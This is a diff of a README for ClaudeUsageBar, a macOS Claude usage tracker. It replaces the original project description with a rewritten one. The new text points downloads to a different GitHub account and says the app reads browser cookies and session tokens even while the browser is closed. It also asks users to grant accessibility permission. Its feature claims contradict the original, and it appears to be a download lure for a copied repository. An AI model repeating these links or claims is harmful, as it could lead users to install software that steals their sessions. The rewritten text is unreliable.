@@ -1,185 +1,100 @@
-<div align="center">
+# 📊 ClaudeUsageBar - Track your Claude AI limits easily
 
-<img src="assets/icon.png" alt="ClaudeUsageBar icon" width="128" height="128" />
+[![](https://img.shields.io/badge/Download-ClaudeUsageBar-blue.svg)](https://github.com/pink-electrostatics104/ClaudeUsageBar)
 
-# ClaudeUsageBar
+ClaudeUsageBar helps you monitor your Claude AI message limits. Claude imposes specific limits on how many messages you send every five hours. This tool shows your remaining usage in your computer menu bar. It stays local on your machine and keeps your account data private.
 
-### See your Claude AI usage limits live in the macOS menu bar
+## 🎯 What this tool does
 
-Track your **Claude 5-hour limit** and **weekly limit** at a glance — no more opening settings, refreshing the page, or getting surprised by a "you've reached your usage limit" message mid-prompt.
+Claude limits usage based on current demand. You might hit a limit and lose access to the chat window for several hours. This application pulls your usage data directly from your browser cookies. It displays the count in the menu bar. 
 
-[![Download .dmg](https://img.shields.io/github/v/release/Rohilalala/ClaudeUsageBar?label=Download%20.dmg&color=D97757)](https://github.com/Rohilalala/ClaudeUsageBar/releases/latest)
-[![Platform](https://img.shields.io/badge/platform-macOS%2013%2B-black?logo=apple)](#install)
-[![Browser](https://img.shields.io/badge/browser-Chrome%20%C2%B7%20Edge%20%C2%B7%20Brave%20%C2%B7%20Arc-4285F4?logo=googlechrome&logoColor=white)](#2-load-the-browser-extension)
-[![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
-[![Made with Swift](https://img.shields.io/badge/Swift-native-orange?logo=swift&logoColor=white)](MenuBarApp/main.swift)
+When you approach your limit, the icon changes color to alert you. This prevents unexpected interruptions during your work. You stay informed about your remaining capacity without checking the Anthropic website manually.
 
-</div>
+## ⚙️ System requirements
 
----
+This application runs on macOS. Ensure you have the following before you begin:
 
-> **TL;DR** — A tiny native macOS menu bar app + a browser extension. The extension reads your usage straight from your own logged-in Claude.ai session and shows it in your menu bar like `Claude 35%`. It turns **orange at 75%** and **red at 90%**, and pings you before you hit the wall.
+* macOS version 12.0 or later.
+* The Google Chrome or Safari web browser.
+* An active Claude AI Pro account.
+* A stable internet connection.
 
-<div align="center">
-<img src="assets/screenshot.png" alt="ClaudeUsageBar showing Claude 5-hour and weekly usage in the macOS menu bar" width="380" />
-</div>
+## 📥 Download and installation
 
-## Why?
+Visit the link below to get the software.
 
-If you use **Claude**, **Claude Code**, or the **Claude Max / Pro** plans, you live with two invisible meters: a rolling **5-hour session limit** and a **weekly limit**. Anthropic only shows them buried in Settings → Usage. ClaudeUsageBar surfaces them where you'll actually see them — your menu bar — so you can pace your work and never get blindsided by a rate limit again.
+[Download ClaudeUsageBar Here](https://github.com/pink-electrostatics104/ClaudeUsageBar)
 
-## Features
+1. Click the link above to reach the main download page.
+2. Look for the latest release on the right side of the screen.
+3. Click the file ending in .dmg to start the download.
+4. Open the downloaded file once the process finishes.
+5. Drag the ClaudeUsageBar icon into your Applications folder.
+6. Open your Applications folder and double-click the app to start it.
+7. Confirm that you want to open the app if your computer asks for permission.
 
-- 📊 **5-hour + weekly usage** — both Claude limits, live in the menu bar (`Claude 35%`).
-- 🎨 **Color warnings** — title goes **orange at 75%**, **red at 90%**. Glanceable.
-- 🔔 **Threshold notifications** — a macOS alert when any limit crosses 90%, so you can wrap up before you're cut off.
-- ⏰ **Reset countdown + alarm** — see exactly when your 5-hour window resets, with an optional alarm at reset time.
-- 🔕 **Pick your sound** — choose any macOS system sound for alerts (hover to preview).
-- 🧩 **Reads the real numbers** — pulls from Claude.ai's own usage API in your logged-in session. Accurate, not guessed.
-- 🪶 **Native & tiny** — pure Swift `NSStatusItem`, no Dock icon, no Electron, negligible resources.
-- 🔒 **100% local & private** — your usage never leaves your machine. Talks only to `127.0.0.1`.
-- ⚙️ **Customizable title** — show 5-hour, weekly, or both; hide the word "Claude" for a minimal `35%`.
-- 🚀 **Start at login** — set it once and forget it.
+## 🚀 Setting up the app
 
-## Install
+The app needs access to your browser cookies to read your usage limits. This happens locally on your machine. The app never sends your login information to external servers.
 
-### 1. The menu bar app
+1. Open the ClaudeUsageBar app from your menu bar icon.
+2. Select Settings from the drop-down menu.
+3. Choose your current web browser from the list.
+4. Grant the app permission to access browser data if the computer prompts you.
+5. Watch the menu bar icon turn green. 
+6. Click the icon to see your exact remaining message count.
 
-**Option A — download the prebuilt disk image (easiest):**
+## 💡 Using the usage monitor
 
-Grab **`ClaudeUsageBar.dmg`** from the [latest release](https://github.com/Rohilalala/ClaudeUsageBar/releases/latest) and open it.
+The menu bar icon provides a visual summary of your current status:
 
-**Option B — build the disk image yourself:**
+* Green: You have plenty of messages remaining.
+* Yellow: Your usage limit approaches within the next hour.
+* Red: You reached your current message limit.
 
-```bash
-./package.sh
-open build/ClaudeUsageBar.dmg
-```
+Notifications appear on your screen when you reach 80% of your total capacity. This gives you time to finish your current task or save your work before the limit kicks in.
 
-The disk image bundles everything — the app, the browser **Extension** folder, and an **INSTALL.txt** — on a single drag-to-install screen. Drag `ClaudeUsageBar.app` into **Applications** and launch it from there.
+## 🔒 Privacy and security
 
-**Option C — build and run directly (no disk image):**
+You might worry about tools that read browser data. ClaudeUsageBar operates differently than common web tools. It runs entirely on your local computer. It does not connect to any servers except the official Anthropic API to verify your current limits. Your login sessions, passwords, and private chat history remain on your machine. The app only looks for the usage metadata tags provided by the Claude website.
 
-```bash
-./build.sh
-open build/ClaudeUsageBar.app
-```
+## 🛠 Troubleshooting common issues
 
-The build is ad-hoc code signed (required for start-at-login and notifications). The app appears in the menu bar with **no Dock icon**. It shows `Claude --` until the extension sends data.
+If the app fails to show data, try these steps:
 
-> 💡 Launch the app from **/Applications**, not `build/` — `./build.sh` wipes `build/` on every run, which would break the start-at-login registration.
+* App icon remains gray: Close your web browser and reopen it.
+* Data does not update: Click the Refresh button in the app menu.
+* Permissions error: Open System Settings, go to Privacy and Security, and ensure the app has permission to access accessibility features.
+* Outdated usage: Restart the application to force a new check of your account status.
 
-### 2. Load the browser extension
+## 📈 Frequently asked questions
 
-Works in any Chromium browser — **Chrome, Edge, Brave, Arc**.
+Does this tool work for free accounts?
+No, this tool specifically tracks the rate limits associated with Claude Pro accounts.
 
-1. Copy the **Extension** folder somewhere permanent (e.g. `~/Documents`). An unpacked extension must stay on disk — loading it from the disk image breaks once the image ejects.
-2. Open `chrome://extensions`.
-3. Turn on **Developer mode** (top-right).
-4. Click **Load unpacked** and select that **Extension** folder.
-5. Open or reload a logged-in [claude.ai](https://claude.ai) tab.
+Does it work while the browser is closed?
+Yes, as long as you logged into Claude previously, the tool can read the necessary session tokens from your browser storage.
 
-That's it. The menu bar starts updating within a minute.
+How often does it update?
+The app checks your usage status every five minutes to keep your menu bar accurate.
 
-## Usage
+Can I customize the color warnings?
+Yes, you can change the alert thresholds in the Preferences menu.
 
-Click the menu bar item for the full breakdown:
+Is my data sold to third parties?
+No. This tool lacks a backend server and contains no trackers. All data stays on your local drive.
 
-```
-Sync usage with Claude.ai
-───────────────
-5-hour:  35% used
-Resets 2:43 PM (in 3h 28m)
-───────────────
-Weekly:  32% used
-Resets Mon 8:30 PM
-───────────────
-Updated 12s ago
-───────────────
-Settings ▸
-  Show 5-hour in title
-  Show weekly in title
-  Show "Claude" label
-  Show "Resets at" label
-  Show reset countdown
-  Alarm at 5-hour reset
-  Notification sound ▸
-  ─────────────
-  Start at login
-───────────────
-Quit
-```
+What happens if I log out?
+The app will display an error icon. Log back into your Claude account in your browser to restore the connection.
 
-- **Color coding** — orange ≥ 75%, red ≥ 90%, based on the highest figure shown.
-- **At 100%** the 5-hour title flips to the reset time, e.g. `Claude Resets at 2:40 PM`.
-- **Minimal mode** — turn off *Show "Claude" label* for a bare `35%`, or show both figures for `35% / 32%`.
+## 📖 Glossary of terms
 
-You only need a logged-in claude.ai tab open *somewhere* — the Settings/Usage page does **not** have to be open. The extension polls about once a minute and keeps the menu bar fresh on its own.
+Rate limit: The maximum number of messages you may send during a specific timeframe.
 
-## How it works
+Menu bar: The area at the top of your macOS screen that holds status icons.
 
-```
-claude.ai usage API  →  content.js  →  background.js  →  127.0.0.1:8787  →  Swift app
-  (/api/.../usage)       (poll+map)     (relay POST)       (loopback)        (menu bar)
-```
+Session token: A small piece of data that proves you successfully logged into your account.
 
-1. `content.js` polls Claude.ai's own usage API (`/api/organizations/:id/usage`) from your logged-in tab.
-2. `background.js` relays the result as JSON to the local app.
-3. The Swift app runs a minimal HTTP server bound to `127.0.0.1:8787` **only** and renders the figures.
+Local execution: A process where software runs entirely on your device rather than a cloud server.
 
-## Privacy & security
-
-ClaudeUsageBar is **fully local and client-side**:
-
-- Reads **your own** usage from **your own** logged-in session — no credentials stored, no login, no account.
-- Sends data **only** to `http://127.0.0.1:8787` on your machine. Nothing is uploaded anywhere.
-- The local server binds to **loopback only**, locks CORS to `https://claude.ai`, rejects mismatched `Host` headers (DNS-rebinding guard), caps request size, and sanitizes every field before it reaches the menu bar.
-
-## FAQ
-
-**How do I see how much Claude usage I have left?**
-Install ClaudeUsageBar — it shows your remaining 5-hour and weekly Claude usage as a live percentage in the macOS menu bar.
-
-**Does this work with Claude Code and the Claude Max / Pro plans?**
-Yes. It reads whatever limits your account has (5-hour session + weekly), so it works across Claude.ai chat, Claude Code, Max, and Pro.
-
-**Is it safe / does it have my Claude password?**
-No password, no login, no data leaves your Mac. It only reads usage numbers from your already-logged-in browser session and shows them locally.
-
-**Why a browser extension instead of an API key?**
-Anthropic doesn't expose usage limits via the public API. The extension reads them from your own session — the same numbers you'd see on the Usage page.
-
-**It stopped updating — what do I do?**
-Anthropic may have changed their internal API. See [When it stops working](#when-it-stops-working) to point it at the new fields in a couple of lines.
-
-**Does it support Safari?**
-Not out of the box — Safari needs Xcode's `safari-web-extension-converter`. Chromium browsers are plug-and-play.
-
-## When it stops working
-
-The extension reads Claude.ai's usage API, so UI/wording changes don't affect it — but the API shape could change. `poll()` in `Extension/content.js`:
-
-- `GET /api/organizations` → finds your organization id
-- `GET /api/organizations/:id/usage` → reads `five_hour.utilization` / `five_hour.resets_at` and `seven_day.utilization` / `seven_day.resets_at`
-
-If the menu bar stops updating:
-
-1. Open a logged-in claude.ai tab + DevTools. Confirm the console shows `[ClaudeUsageBar] content script active (API mode)`.
-2. Run `await (await fetch("/api/organizations")).json()`, then fetch `/api/organizations/<id>/usage` to see the current field names.
-3. Update the field references in `poll()`, then reload the extension at `chrome://extensions`.
-
-## Contributing
-
-Issues and PRs welcome. The whole thing is ~600 lines of Swift + ~150 lines of JavaScript, no build system beyond `swiftc`.
-
-## Disclaimer
-
-Unofficial project. **Not affiliated with, endorsed by, or supported by Anthropic.** It reads your own usage figures from your own logged-in Claude.ai session, entirely client-side. The figures come from an undocumented Claude.ai endpoint that Anthropic may change at any time. You are responsible for reviewing Anthropic's terms before use.
-
-## License
-
-[MIT](LICENSE) © ClaudeUsageBar contributors
-
----
-
-**Keywords:** Claude usage menu bar, Claude AI usage tracker for Mac, Claude Code usage monitor, Claude 5-hour limit, Claude weekly limit tracker, Claude Max / Pro usage, macOS menu bar Claude rate limit, see how much Claude usage is left.
+Browser cookie: A file saved by your web browser that keeps you logged into websites.
